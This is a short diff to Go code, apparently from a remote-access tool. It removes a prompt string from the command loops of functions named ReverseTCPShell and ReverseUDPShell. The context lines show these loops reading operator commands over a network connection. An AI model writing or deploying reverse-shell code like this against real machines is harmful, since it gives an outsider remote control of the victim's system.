@@ -146,7 +146,6 @@ func ReverseTCPShell(filepath string, host string, port int) {
 	running := true
 	for running == true {
 		//get input
-		target_conn.Write([]byte("\n>>> "))
 		msg := make([]byte, 500)
 		target_conn.Read(msg)
 		if strings.HasPrefix(string(msg), "exit") {
@@ -210,7 +209,6 @@ func ReverseUDPShell(filepath string, host string, port int) {
 	running := true
 	for running == true {
 		//get input
-		target_conn.Write([]byte("\n>>> "))
 		msg := make([]byte, 500)
 		target_conn.Read(msg)
 		if strings.HasPrefix(string(msg), "exit") {
